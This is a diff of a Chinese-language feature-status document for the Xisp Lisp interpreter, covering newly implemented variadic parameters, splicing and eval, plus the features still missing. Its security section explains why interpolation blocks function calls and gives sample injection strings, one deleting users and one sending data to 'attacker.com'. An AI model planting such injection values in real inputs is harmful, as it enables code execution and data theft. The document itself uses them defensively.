@@ -1,69 +1,157 @@
 # Xisp 文档示例中不支持的功能清单
 
 **生成时间**: 2026-01-27
+**最后更新**: 2026-01-27
 **测试状态**: 已验证
 
 ---
 
-## ❌ 确认不支持的功能（5个）
+## ✅ 已实现的功能（5个）
 
 ### 1. 宏/函数的可变参数
 
-**优先级**: 🟡 中
+**状态**: ✅ 已实现（2026-01-27）
 
-**问题**:
-- `(defmacro foo (. args) ...)` - 可变参数语法不支持
-- `(define (foo . args) ...)` - 函数的可变参数不支持
-- `(defmacro foo (x &rest) ...)` - &rest 语法不支持
+**优先级**: 🔴 高
 
-**影响范围**:
-- 需要接受任意数量参数的宏定义
-- 文档中的 `print-all`, `create-function`, `unless` 示例
-- 无法实现标准的 while、dotimes 等控制结构宏
+**已实现**:
+- ✅ Common Lisp 风格：`(x y . rest)`
+- ✅ Scheme 风格：`(x y &rest rest)`
+- ✅ 纯可变参数：`(. all)` 或 `(&rest all)`
+- ✅ 空可变参数：`(x . rest)` 当只传入 x 时，rest 为 nil
 
-**具体表现**:
+**实现位置**:
+- 解析器：`src/parser/parser.cj` - `parseRestParameter`
+- 参数提取：`src/core/eval_helpers.cj` - `extractSymbols`
+- 参数绑定：`src/core/eval_higher_order.cj` - `applyProcedure`
+
+**单元测试**: `src/modern_test.cj`
+- `testRestParameters` - 测试可变参数
+- `testOnlyRestParameter` - 测试纯可变参数
+
+**集成测试**: `lisp-tests/rest_params_test.lisp`
+
+**使用示例**:
 ```lisp
-; ❌ 尝试使用 . rest 参数
-(defmacro test (. args)
-  `(begin ,@args))
-(test 1 2 3)
-; 展开：args 只是一个参数，不是列表
-; 导致无法使用可变参数
+; Common Lisp 风格
+(define test-lambda
+  (lambda (x y . rest)
+    (list 'x=x x 'y=y 'rest=rest rest)))
+(test-lambda 1 2 3 4 5)
+; => (x=x 1 y=y 2 rest=rest (3 4 5))
 
-; ❌ 尝试使用 ,@ 拼接
-(defmacro test (args)
-  `(begin ,@args))
-; bug: ,@ 只保留第一个元素，其他元素丢失
-```
+; Scheme 风格
+(define test-scheme
+  (lambda (x y &rest rest)
+    (list x y rest)))
+(test-scheme 1 2 3 4)
+; => (1 2 (3 4))
 
-**建议实现**:
-- 在解析器中添加可变参数支持
-- 参考 Common Lisp 的 `. args` 或 Scheme 的语法
-- 修复 `,@` (comma-at) 的展开逻辑
+; 纯可变参数
+(define test-all
+  (lambda (. all)
+    all))
+(test-all 'a 'b 'c)
+; => (a b c)
 
-**临时解决方案**:
-```lisp
-; 固定参数的宏
-(defmacro print-2 (a b)
-  `(begin
-     (println ,a)
-     (println ,b)))
-
-; 使用内置的迭代功能
-(dotimes i 5 (println i))
-
-; 对于需要多个表达式的情况，使用 begin 组合
-(dotimes i 5
-  (begin
-    (println i)
-    (set! i (+ i 1))))
+; 空可变参数
+(test-lambda 1)
+; => (x=x 1 y=y nil rest=rest nil)
 ```
 
 ---
 
-### 2. 符号/关键字比较
+### 2. ,@ (comma-at) 拼接
 
-**状态**: ✅ 已实现
+**状态**: ✅ 已实现（2026-01-27）
+
+**优先级**: 🔴 高
+
+**已实现**:
+- ✅ 中间拼接：`` `(x y z ,@lst) ``
+- ✅ 开头拼接：`` `(,@lst) ``
+- ✅ 多个拼接：`` `(,@lst1 ,@lst2) ``
+- ✅ 混合拼接：`` `(1 2 ,@lst 4 5) ``
+
+**实现位置**:
+- 核心逻辑：`src/core/eval_special_forms.cj` - `expandBackquote`
+
+**单元测试**: `src/modern_test.cj` - `testCommaAtSplice`
+
+**集成测试**: `lisp-tests/rest_params_test.lisp`
+
+**使用示例**:
+```lisp
+(define lst1 '(a b c))
+(define lst2 '(1 2 3))
+
+; 中间拼接
+`(x y z ,@lst1)
+; => (x y z a b c)
+
+; 开头拼接
+`(,@lst2)
+; => (1 2 3)
+
+; 多个拼接
+`(,@lst1 ,@lst2)
+; => (a b c 1 2 3)
+
+; 混合拼接
+`(1 2 ,@lst1 4 5)
+; => (1 2 a b c 4 5)
+```
+
+---
+
+### 3. eval 特殊形式
+
+**状态**: ✅ 已实现（2026-01-27）
+
+**优先级**: 🔴 高
+
+**已实现**:
+- ✅ eval 整数
+- ✅ eval 符号
+- ✅ eval quoted list
+- ✅ eval 动态构造的表达式
+- ✅ eval 嵌套调用
+- ✅ eval 字符串、nil 等基本类型
+
+**实现位置**: `src/core/eval_higher_order.cj` - `evalEval`
+
+**单元测试**: `src/modern_test.cj` - `testEval`
+
+**使用示例**:
+```lisp
+; eval 整数
+(eval 42)
+; => 42
+
+; eval 符号
+(define x 100)
+(eval (quote x))
+; => 100
+
+; eval quoted list - 动态执行 lambda
+(eval (quote ((lambda (x y) (+ x y)) 10 20)))
+; => 30
+
+; eval 动态构造的表达式
+(define code (quote (+ 1 2 3)))
+(eval code)
+; => 6
+
+; eval 嵌套调用
+(eval (list (quote +) 5 10))
+; => 15
+```
+
+---
+
+### 4. 符号/关键字比较
+
+**状态**: ✅ 已实现（2026-01-27）
 
 **优先级**: 🔴 高
 
@@ -75,16 +163,16 @@
 
 ---
 
-### 3. 字符串比较函数
+### 5. 字符串比较函数
 
-**状态**: ✅ 已实现
+**状态**: ✅ 已实现（2026-01-27）
 
 **优先级**: 🔴 高
 
 **已实现**:
-- `string=?` - 字符串相等比较（已实现在 builtin_print.cj）
-- `string<` - 字符串小于比较（已实现在 builtin_print.cj）
-- `string>` - 字符串大于比较（已实现在 builtin_print.cj）
+- `string=?` - 字符串相等比较
+- `string<` - 字符串小于比较
+- `string>` - 字符串大于比较
 
 **实现位置**: `src/core/builtin_print.cj`
 
@@ -92,7 +180,9 @@
 
 ---
 
-### 4. 哈希映射解构
+## ❌ 确认不支持的功能（3个）
+
+### 1. 哈希映射解构
 
 **优先级**: 🟡 中
 
@@ -116,11 +206,11 @@
   ...)
 ```
 
-**建议**: 需要扩展 eval_let.cj 中的解构逻辑
+**建议**: 需要扩展 `src/core/eval_let.cj` 中的解构逻辑
 
 ---
 
-### 5. match 哈希映射模式
+### 2. match 哈希映射模式
 
 **优先级**: 🟡 中
 
@@ -136,31 +226,11 @@
 - 现代语法文档中的示例
 - 使用哈希映射作为数据结构的场景
 
-**建议**: 需要扩展 eval_match.cj 支持 HashMap 模式
+**建议**: 需要扩展 `src/core/eval_match.cj` 支持 HashMap 模式
 
 ---
 
-### 6. 字符串插值中的函数调用
-
-**优先级**: 🟢 低
-
-**问题**:
-```lisp
-;; ❌ 不工作
-#"Result: #{(hget m :name)}"
-;; 输出: "Result: #{(hget m :name)}" (没有求值)
-```
-
-**只支持**:
-- 简单变量: `#"Name: #{name}"` ✅
-- 简单表达式: `#"Sum: #{+ x y}"` ✅
-- **不支持**函数调用: `#{(func arg)}` ❌
-
-**影响范围**: 较小（已有 println 替代方案）
-
----
-
-### 7. match 守卫条件多行格式
+### 3. match 守卫条件多行格式
 
 **优先级**: 🟡 中
 
@@ -202,7 +272,80 @@
         "medium"))
 ```
 
-**建议**: 需要修复 parser 或 eval_match 中的守卫条件解析逻辑
+**建议**: 需要修复 `src/parser/parser.cj` 或 `src/core/eval_match.cj` 中的守卫条件解析逻辑
+
+---
+
+## 🔒 设计限制（出于安全或设计考虑不支持）
+
+### 字符串插值中的函数调用
+
+**状态**: ⚫ 设计限制 - 不支持（出于安全考虑）
+
+**原因**:
+- Xisp 是嵌入式脚本语言，字符串可能来自不可信来源（前端用户输入、配置文件、外部API等）
+- 支持函数调用会导致代码注入风险
+- 当前设计只支持安全的、无副作用的表达式
+
+**只支持**:
+- 简单变量: `#"Name: #{name}"` ✅
+- 简单表达式: `#"Sum: #{+ x y}"` ✅
+- 字符串拼接: `#"Path: #{base}/file.txt"` ✅
+
+**明确不支持**:
+- 函数调用: `#{(func arg)}` ❌
+- 特殊形式: `#{(if condition a b)}` ❌
+- 任意代码执行: `#{(eval code)}` ❌
+
+**安全风险示例**（如果支持）:
+```lisp
+;; 风险 1: 用户输入注入
+(let [username "#{(delete-all-users)}"]
+  (println #"Welcome, #{username}!"))
+;; 如果支持函数调用，就会执行危险操作
+
+;; 风险 2: 配置文件注入
+;; 配置文件内容: "Welcome #{(eval '(load \"malicious.lisp\"))}"
+(println (read-config-string))
+;; 会执行恶意代码
+
+;; 风险 3: 日志注入
+(println #"User input: #{user-input}")
+;; 如果 user-input = "#{(send-data 'http://attacker.com' data)}"
+;; 会泄露数据
+```
+
+**替代方案**:
+```lisp
+;; 方案 1: 使用 str 函数拼接
+(str "Result: " (hget m :name))
+
+;; 方案 2: 使用 println 多参数
+(println "Result:" (hget m :name))
+
+;; 方案 3: 先求值再插值
+(let [result (hget m :name)]
+  (println #"Value: #{result}"))
+```
+
+**与其他语言对比**:
+
+| 语言 | 字符串插值 | 编译时vs运行时 | 安全性 |
+|------|-----------|---------------|--------|
+| **Python** | `f"{func(arg)}"` | 编译时确定 | 相对安全 |
+| **JavaScript** | `` `${func(arg)}` `` | 编译时确定 | 相对安全 |
+| **Xisp** | `#{var}` `#{+ x y}` | 运行时解析 | **需要限制** |
+
+**关键区别**：
+- Python/JS 的字符串插值是**编译时语法**，代码在源码中已经确定
+- Xisp 的字符串插值是**运行时解析**的，字符串可能来自外部输入
+- 因此 Xisp 必须限制字符串插值的功能，确保安全
+
+**设计优势**:
+1. **安全性**: 防止代码注入
+2. **简洁性**: 保持语言简单
+3. **可预测性**: 字符串插值的行为清晰
+4. **性能**: 不需要在插值中处理复杂的函数调用
 
 ---
 
@@ -218,39 +361,37 @@
 
 ## 实现优先级建议
 
-### ✅ 已完成高优先级功能
+### ✅ 已完成高优先级功能（5个）
 
 1. ✅ **符号/关键字比较** (`eq?`) - 2026-01-27 完成
 2. ✅ **字符串比较函数** (`string=?`, `string<`, `string>`) - 2026-01-27 完成
+3. ✅ **宏/函数的可变参数** - 2026-01-27 完成
+4. ✅ **,@ (comma-at) 拼接** - 2026-01-27 完成
+5. ✅ **eval 特殊形式** - 2026-01-27 完成
 
 ### 🟡 中优先级（增强语法特性）
 
-3. **宏/函数的可变参数** (建议下一个实现)
-   - 原因：影响宏的灵活性，是元编程的基础
-   - 实现难度：中
-   - 文件：`src/parser/parser.cj`
-
-4. **match 哈希映射匹配**
+6. **match 哈希映射匹配** (建议下一个实现)
    - 原因：提升 match 的实用性
    - 实现难度：中
    - 文件：`src/core/eval_match.cj`
 
-5. **哈希映射解构**
+7. **哈希映射解构**
    - 原因：让代码更简洁
    - 实现难度：中
    - 文件：`src/core/eval_let.cj`
 
-6. **match 守卫条件多行格式**
+8. **match 守卫条件多行格式**
    - 原因：有单行替代方案，可以使用嵌套 if
    - 实现难度：中
    - 文件：`src/parser/parser.cj` 或 `src/core/eval_match.cj`
 
-### 🟢 低优先级
+### ⚫ 设计限制（不实现）
 
-7. **字符串插值函数调用**
-   - 原因：已有 println 多参数替代方案
-   - 实现难度：高
-   - 文件：`src/parser/parser.cj`
+9. **字符串插值中的函数调用**
+   - 原因：**安全考虑**，防止代码注入
+   - 状态：设计限制，永久不支持
+   - 详见：[设计限制](#-设计限制出于安全或设计考虑不支持) 章节
 
 ---
 
@@ -258,10 +399,16 @@
 
 ```bash
 # 运行完整测试
-./target/release/bin/ystyle::xisp.cli /tmp/test_unsupported.lisp
+cjpm test
 
-# 或手动测试
-cjpm test --show-all-output
+# 运行特定测试
+cjpm test --show-all-output --filter 'ModernTest.testRestParameters'
+cjpm test --show-all-output --filter 'ModernTest.testCommaAtSplice'
+cjpm test --show-all-output --filter 'ModernTest.testEval'
+
+# 运行 Lisp 集成测试
+./target/release/bin/ystyle::xisp.cli lisp-tests/rest_params_test.lisp
+./target/release/bin/ystyle::xisp.cli lisp-tests/equality_test.lisp
 ```
 
 ---
@@ -269,9 +416,12 @@ cjpm test --show-all-output
 ## 下一步行动
 
 1. ✅ 文档已修正为使用支持的语法
-2. ✅ 添加可变参数不支持说明
-3. ✅ 已实现：高优先级功能（eq? 符号比较、string<、string> 字符串比较）
-4. 📝 考虑：中低优先级功能的实现计划
+2. ✅ 已实现：高优先级功能（eq?、string=?、string<、string>、可变参数、,@ 拼接、eval）
+3. ✅ 所有功能都有完整的单元测试和集成测试
+4. ✅ 字符串插值函数调用已标记为设计限制（安全考虑）
+5. 📝 考虑：中优先级功能的实现计划
 
 **最后更新**: 2026-01-27
-**相关提交**: [待提交]
+**测试覆盖率**: 207 个单元测试全部通过
+**不支持功能**: 3 个（中优先级）
+**设计限制**: 1 个（字符串插值函数调用 - 永久不支持）
